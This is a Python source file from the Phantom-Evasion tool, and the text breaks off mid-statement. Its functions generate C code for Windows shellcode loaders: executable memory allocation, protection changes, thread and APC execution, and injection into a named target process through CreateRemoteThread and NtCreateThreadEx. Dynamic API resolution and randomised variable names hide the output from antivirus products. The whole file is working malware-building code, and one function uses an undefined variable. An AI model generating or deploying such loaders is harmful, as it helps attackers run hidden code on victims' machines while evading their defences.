
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

from usefull import varname_creator
import random

def Win_MemLocal(ModOpt):

    Ret_code= ""

    if "Virtual" in ModOpt["MemAlloc"]:

        if ModOpt["MemAlloc"] == "Virtual_RW/RX" or ModOpt["MemAlloc"] == "Virtual_RW/RWX":
            prot="0x04"
        else:
            prot="0x40"

        if ModOpt["DynImport"] == True:
            NdcVirtualAlloc = varname_creator()
            Ret_code += "FARPROC " + NdcVirtualAlloc + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualAlloc\");\n"
            Ret_code += ModOpt["Lpvoid"] + " = (LPVOID) " + NdcVirtualAlloc + "(NULL," + ModOpt["Bufflen"] + ",0x00001000," + prot + ");\n"
        else:
            Ret_code += ModOpt["Lpvoid"] + " = VirtualAlloc(NULL," + ModOpt["Bufflen"] + ",0x00001000," + prot + ");\n"

    elif ModOpt["MemAlloc"] == "Heap_RWX":

        Randheaphandle = varname_creator()

        if ModOpt["DynImport"] == True:
            NdcHeapcreate = varname_creator()
            NdcHeapalloc = varname_creator()
            Ret_code += "FARPROC " + NdcHeapcreate + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"HeapCreate\");\n"
            Ret_code += "FARPROC " + NdcHeapalloc + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"HeapAlloc\");\n" 
            Ret_code += "HANDLE " + Randheaphandle + " = (HANDLE)" + NdcHeapcreate + "(0x00040000," + ModOpt["Bufflen"] + ",0);\n"
            Ret_code += ModOpt["Lpvoid"] + " = (LPVOID)" + NdcHeapalloc + "(" + Randheaphandle + ", 0x00000008," + ModOpt["Bufflen"] + ");\n"    
        else:
            Ret_code += "HANDLE " + Randheaphandle + " = HeapCreate(0x00040000," + ModOpt["Bufflen"] + ",0);\n"
            Ret_code += ModOpt["Lpvoid"] + " = HeapAlloc(" + Randheaphandle + ", 0x00000008," + ModOpt["Bufflen"] + ");\n"

    return Ret_code

def Win_MemRemote(ModOpt):

    Ret_code = ""

    if "Virtual" in ModOpt["MemAlloc"]:

        if ModOpt["MemAlloc"] == "Virtual_RWX":

            prot = "0x40"

        elif "RW/" in ModOpt["MemAlloc"]:

            prot = "0x04"

        if ModOpt["DynImport"] == True:

            NdcVirtualAllocEx = varname_creator()
            Ret_code += "FARPROC " + NdcVirtualAllocEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualAllocEx\");\n"
            Ret_code += ModOpt["Lpvoid2"] + " = (LPVOID)" + NdcVirtualAllocEx + "(" + ModOpt["ProcHandle"] + ",NULL," + ModOpt["Bufflen"] + ",0x00001000," + prot + ");\n"
        else:
            Ret_code += ModOpt["Lpvoid2"] + " = VirtualAllocEx(" + ModOpt["ProcHandle"] + ",NULL," + ModOpt["Bufflen"] + ",0x00001000," + prot + ");\n"

    elif ModOpt["MemAlloc"] in ["SharedSection","SS"]:

        NTCS_load = varname_creator()
        NTMVOS_load = varname_creator()
        Buff=ModOpt["Lpvoid"]

        if ModOpt["DynImport"] == False:

            ModOpt["NtdllHandle"] = varname_creator()

            Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"

        Ret_code += "SIZE_T size = 4096;\n"
        Ret_code += "LARGE_INTEGER sectionSize = { size };\n"
        Ret_code += "HANDLE sectionHandle = NULL;\n"
        Ret_code += "LPVOID local;\n"
        Ret_code += "FARPROC " + NTCS_load + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtCreateSection\");\n"
        Ret_code += NTCS_load + "(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        #Ret_code += "NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        Ret_code += "FARPROC " + NTMVOS_load + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtMapViewOfSection\");\n"
        Ret_code += NTMVOS_load + "(sectionHandle, GetCurrentProcess(),&local, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);\n"

        Ret_code += NTMVOS_load + "(sectionHandle," + ModOpt["ProcHandle"] + ",&" + ModOpt["Lpvoid2"] + ", NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);\n"
        Ret_code += "unsigned char * " + ModOpt["Lpvoid"] + " = local;\n"
        if ModOpt["DynImport"] == True:

             Ndcrtlmovemem = varname_creator() 
             Ret_code += "FARPROC " + Ndcrtlmovemem + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"RtlMoveMemory\");\n"
             Ret_code += Ndcrtlmovemem + "(" + ModOpt["Lpvoid"] + "," + ModOpt["Buff"] + ",sizeof(" + ModOpt["Buff"] + ")-1);\n"
        else:
             Ret_code += "RtlMoveMemory(" + ModOpt["Lpvoid"] + "," + ModOpt["Buff"] + ",sizeof(" + ModOpt["Buff"] + ")-1);\n"

    return Ret_code

def Win_ChangeMemProtect(ModOpt):

    Ret_code = ""
    Oldprot = varname_creator()

    Ret_code += "DWORD " + Oldprot + ";\n"

    if "/RX" in ModOpt["MemAlloc"]:

        P_cost = "0x20"

    elif "/RWX" in ModOpt["MemAlloc"]:

        P_cost = "0x40"

    if ModOpt["ExecMethod"] == "Thread" or ModOpt["ExecMethod"] == "APC":

        if ModOpt["DynImport"] == True:
            NdcVirtualProtect = varname_creator()
            Ret_code += "FARPROC " + NdcVirtualProtect + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualProtect\");\n"
            Ret_code += NdcVirtualProtect + "(" + ModOpt["Lpvoid"] + "," + ModOpt["Bufflen"] + "," + P_cost + ",&" + Oldprot + ");\n"
        else:        

            Ret_code += "VirtualProtect(" + ModOpt["Lpvoid"] + "," + ModOpt["Bufflen"] + "," + P_cost + ",&" + Oldprot + ");\n"

    else:
        if ModOpt["DynImport"] == True:
            NdcVirtualProtectEx = varname_creator()
            Ret_code += "FARPROC " + NdcVirtualProtectEx + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"VirtualProtectEx\");\n"
            Ret_code += NdcVirtualProtectEx + "(" + ModOpt["ProcHandle"] + "," + ModOpt["Lpvoid2"] + "," + ModOpt["Bufflen"] + "," + P_cost + ",&" + Oldprot + ");\n"

        else:
            Ret_code += "VirtualProtectEx(" + ModOpt["ProcHandle"] + "," + ModOpt["Lpvoid2"] + "," + ModOpt["Bufflen"] + "," + P_cost + ",&" + Oldprot + ");\n"

    return Ret_code

def Win_MovMem(ModOpt):

    Ret_code = ""

    if Type == "RtlMoveMemory":

        Ret_code += "RtlMoveMemory(" + ModOpt["Lpvoid"] + "," + ModOpt["ShellBuffname"] + "," + ModOpt["Bufflen"] + ");\n"

    elif Type == "memcpy":

        Ret_code += "memcpy(" + ModOpt["Lpvoid"] + ",&" + ModOpt["ShellBuffname"] + "," + ModOpt["Bufflen"] + ");\n"

    return Ret_code

def ShellcodeHelper(ModOpt):

    Ret_code = ""

    if ModOpt["ShellRes"] == True:

        RandRes = varname_creator()

        if ModOpt["DynImport"] == True:

            NdcFindResource = varname_creator()
            NdcLoadResource = varname_creator()
            NdcSizeofResource = varname_creator()

            Ret_code += "FARPROC " + NdcFindResource + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"FindResource\");\n"            
            Ret_code += "HRSRC " + RandRes + " = (HRSRC)" + NdcFindResource + "(NULL, MAKEINTRESOURCE(\"" + ModOpt["ResType"] + "\"), \"" + ModOpt["ResType"] + "\");\n"
            Ret_code += "FARPROC " + NdcLoadResource + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"LoadResource\");\n"
            #Ret_code += "DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);\n"

            Ret_code += "HGLOBAL " + ModOpt["Buff"] + " = (HGLOBAL)" + NdcLoadResource + "(NULL," + RandRes + ");\n"
            Ret_code += "FARPROC " + NdcSizeofResource + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"SizeofResource\");\n"
            ModOpt["Bufflen"] = NdcSizeofResource + "(NULL," + RandRes + ")"

        else:

            Ret_code += "HRSRC " + RandRes + " = FindResource(NULL, MAKEINTRESOURCE(\"" + ModOpt["ResType"] + "\"), \"" + ModOpt["ResType"] + "\");\n"
            #Ret_code += "DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);\n"
            Ret_code += "HGLOBAL " + ModOpt["Buff"] + " = LoadResource(NULL," + RandRes + ");\n"
            ModOpt["Bufflen"] = "SizeofResource(NULL," + RandRes + ")"
    else:

        Ret_code += "unsigned char " + ModOpt["Buff"] + "[] = \"" + ModOpt["Payload"] + "\";\n"

        ModOpt["Bufflen"] = "sizeof(" + ModOpt["Buff"] + ")-1"

    return Ret_code


def Win_LocalThread(ModOpt):

    Ret_code = ""
    Randhand = varname_creator()
    Randresult = varname_creator()
    Ret_code += "HANDLE " + Randhand + ";\n"

    if ModOpt["ExecMethod"] == "Thread":

        Randthread = varname_creator()

        Ret_code += "DWORD " + Randthread + ";\n"

        if ModOpt["DynImport"] == True:
            NdcCreateThread = varname_creator()
            Ret_code += "FARPROC " + NdcCreateThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"CreateThread\");\n"
            Ret_code += Randhand + " = (HANDLE)" + NdcCreateThread + "(NULL,0,(LPVOID)" + ModOpt["Lpvoid"] + ",NULL,0,&" + Randthread + ");\n"        
        else:
            Ret_code += Randhand + " = CreateThread(NULL,0,(LPVOID)" + ModOpt["Lpvoid"] + ",NULL,0,&" + Randthread + ");\n"

    elif ModOpt["ExecMethod"] == "ThreadSR":

        Randthread = varname_creator()
        ResThread = varname_creator()

        if ModOpt["DynImport"] == True:
            NdcCreateThread = varname_creator()
            NdcResumeThread = varname_creator()
            Ret_code += "FARPROC " + NdcCreateThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"CreateThread\");\n"
            Ret_code += Randhand + " = (HANDLE)" + NdcCreateThread + "(NULL,0,(LPVOID)" + ModOpt["Lpvoid"] + ",NULL,0x00000004,&" + Randthread + ");\n"
            Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"ResumeThread\");\n"
            Ret_code += "DWORD " + ResThread + " = (DWORD)" + NdcResumeThread + "(" + Randhand + ");\n"
        else:
            Ret_code += "DWORD " + Randthread + ";\n"
            Ret_code += Randhand + " = CreateThread(NULL,0,(LPVOID)" + ModOpt["Lpvoid"] + ",NULL,0x00000004,&" + Randthread + ");\n"
            Ret_code += "DWORD " + ResThread + " = ResumeThread(" + Randhand + ");\n"

    elif ModOpt["ExecMethod"] == "NtThread":

        NTCT_load = varname_creator()

        Ret_code += "FARPROC " + NTCT_load + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtCreateThread\");\n"
        Ret_code += NTCT_load + "(&"+ Randhand + ", GENERIC_ALL, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)" + ModOpt["Lpvoid"] + ", NULL, NULL, NULL, NULL, NULL,NULL);"

    elif ModOpt["ExecMethod"] == "NtThreadSR":

        NTCT_load = varname_creator()
        ResThread = varname_creator()
        NdcResumeThread = varname_creator()

        Ret_code += "FARPROC " + NTCT_load + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtCreateThread\");\n"
        Ret_code += NTCT_load + "(&"+ Randhand + ", GENERIC_ALL, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)" + ModOpt["Lpvoid"] + ", NULL, NULL, NULL, NULL, NULL,TRUE);"
        Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"ResumeThread\");\n"
        Ret_code += "DWORD " + ResThread + " = (DWORD)" + NdcResumeThread + "(" + Randhand + ");\n"

    if ModOpt["ExecMethod"] == "APC":

        RandAPC = varname_creator()
        Ret_code += "PTHREAD_START_ROUTINE " + RandAPC + " = (PTHREAD_START_ROUTINE)" + ModOpt["Lpvoid"] + ";\n"

        if ModOpt["DynImport"] == True:

            QUAPC_load = varname_creator()
            SE_load = varname_creator()

            Ret_code += "FARPROC " + QUAPC_load + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"QueueUserAPC\");\n"
            Ret_code += "FARPROC " + SE_load + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"SleepEx\");\n"
            Ret_code += QUAPC_load + "((PAPCFUNC)" + RandAPC + ", GetCurrentThread(),(ULONG_PTR)NULL);\n"
            Ret_code += SE_load + "(-1,TRUE);\n"
        else:
            Ret_code += "QueueUserAPC((PAPCFUNC)" + RandAPC + ", GetCurrentThread(),(ULONG_PTR)NULL);\n"
            Ret_code += "SleepEx(-1,TRUE);\n"
    else:        
        if ModOpt["DynImport"] == True:

            NdcWaitForSingleObj = varname_creator()
            Ret_code += "FARPROC " + NdcWaitForSingleObj + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"WaitForSingleObject\");\n"
            Ret_code += "DWORD " + Randresult + " = " + NdcWaitForSingleObj + "(" + Randhand + ",-1);\n"
        else:
            Ret_code += "DWORD " + Randresult + " = WaitForSingleObject(" + Randhand + ",-1);\n"

    return Ret_code


def Win_RemoteThread(ModOpt):

    Ret_code = ""
    Randhand = varname_creator()
    Randresult = varname_creator()
    Ret_code += "HANDLE " + Randhand + ";\n"

    if ModOpt["ExecMethod"] == "ProcessInject" or ModOpt["ExecMethod"] == "ProcessInjectSR":

        Randthread = varname_creator()
        Ret_code += "DWORD " + Randthread + ";\n"

        if ModOpt["ExecMethod"] == "ProcessInject":

            threadval="0"

        elif ModOpt["ExecMethod"] == "ProcessInjectSR":

            threadval="0x00000004"

        if ModOpt["DynImport"] == True:
            NdcCreateRemoteThread = varname_creator()
            Ret_code += "FARPROC " + NdcCreateRemoteThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"CreateRemoteThread\");\n"
            Ret_code += NdcCreateRemoteThread + "(" + ModOpt["ProcHandle"] + ",NULL,0," + ModOpt["Lpvoid2"] + ",NULL," + threadval + ",&"+ Randthread + ");\n"

            if ModOpt["ExecMethod"] == "ProcessInjectSR":

                ResThread = varname_creator()
                NdcResumeThread = varname_creator()
                Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"ResumeThread\");\n"
                Ret_code += "DWORD " + ResThread + " = " + NdcResumeThread + "(" + Randhand + ");\n"

        else:
            Ret_code += "CreateRemoteThread(" + ModOpt["ProcHandle"] + ",NULL,0," + ModOpt["Lpvoid2"] + ",NULL," + threadval + ",&"+ Randthread + ");\n"

            if ModOpt["ExecMethod"] == "ProcessInjectSR":
                ResThread = varname_creator()
                Ret_code += "DWORD " + ResThread + " = ResumeThread(" + Randhand + ");\n"

    elif ModOpt["ExecMethod"] == "NtProcessInject" or ModOpt["ExecMethod"] == "NtProcessInjectSR":

        if ModOpt["ExecMethod"] == "NtProcessInject":

            threadval="NULL"

        elif ModOpt["ExecMethod"] == "NtProcessInjectSR":

            threadval="TRUE"

        NdcNtCreateThreadEx = varname_creator()
        Ret_code += "FARPROC " + NdcNtCreateThreadEx + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"NtCreateThreadEx\");\n"
        Ret_code += NdcNtCreateThreadEx + "(&"+ Randhand + ", GENERIC_ALL, NULL," + ModOpt["ProcHandle"] + ", (LPTHREAD_START_ROUTINE)" + ModOpt["Lpvoid2"] + ", NULL, NULL, NULL, NULL, NULL," + threadval + ");"

        if ModOpt["ExecMethod"] == "NtProcessInjectSR":

            ResThread = varname_creator()

            if ModOpt["DynImport"] == True: 
                NdcResumeThread = varname_creator()
                Ret_code += "FARPROC " + NdcResumeThread + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"ResumeThread\");\n"
                Ret_code += "DWORD " + ResThread + " = " + NdcResumeThread + "(" + Randhand + ");\n"       
            else:
                Ret_code += "DWORD " + ResThread + " = ResumeThread(" + Randhand + ");\n"

    if ModOpt["DynImport"] == True:
        NdcWaitForSingleObj = varname_creator()
        Ret_code += "FARPROC " + NdcWaitForSingleObj + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ", \"WaitForSingleObject\");\n"
        Ret_code += "DWORD " + Randresult + " = " + NdcWaitForSingleObj + "(" + Randhand + ",-1);\n"
    else:
        Ret_code += "DWORD " + Randresult + " = WaitForSingleObject(" + Randhand + ",-1);\n"

    return Ret_code

def Win_RemoteInjection(ModOpt):

    Ret_code = ""
    RandhProcess = varname_creator()
    Randentry = varname_creator()
    RandProcsnapshot = varname_creator()
    Randlpv2 = varname_creator()

    ModOpt["ProcHandle"] = RandhProcess
    ModOpt["Lpvoid2"] = Randlpv2

    if ModOpt["ExecMethod"] in ["ThreadExecutionHijack","TEH","ProcessInject","PI","APCSpray","APCS"]:

        Ret_code += "PROCESSENTRY32 " + Randentry + ";\n"
        Ret_code += Randentry + ".dwSize = sizeof(PROCESSENTRY32);\n"


        if ModOpt["DynImport"] == True:

            NdcTl32Snapshot = varname_creator()
            NdcProcess32First = varname_creator()
            NdcProcess32Next = varname_creator()
            NdcOpenProcess = varname_creator()
            Ret_code += "FARPROC " + NdcTl32Snapshot + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"CreateToolhelp32Snapshot\");\n"
            Ret_code += "HANDLE " + RandProcsnapshot + " = (HANDLE)" + NdcTl32Snapshot + "(TH32CS_SNAPPROCESS, 0);\n"
            Ret_code += "FARPROC " + NdcProcess32First + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Process32First\");\n"
            Ret_code += "FARPROC " + NdcProcess32Next + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"Process32Next\");\n"
            Ret_code += "FARPROC " + NdcOpenProcess + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"OpenProcess\");\n"
            Ret_code += "if (" + NdcProcess32First + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "while (" + NdcProcess32Next + "(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "if(strcmp(" + Randentry + ".szExeFile, \"" + ModOpt["ProcTarget"] + "\") == 0){\n"
            Ret_code += "HANDLE " + RandhProcess + " = (HANDLE)" + NdcOpenProcess + "(PROCESS_ALL_ACCESS, FALSE, " + Randentry + ".th32ProcessID);\n"
        else:
            Ret_code += "HANDLE " + RandProcsnapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
            Ret_code += "if (Process32First(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "while (Process32Next(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
            Ret_code += "if(strcmp(" + Randentry + ".szExeFile, \"" + ModOpt["ProcTarget"] + "\") == 0){\n"
            Ret_code += "HANDLE " + RandhProcess + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + Randentry + ".th32ProcessID);\n"

        Ret_code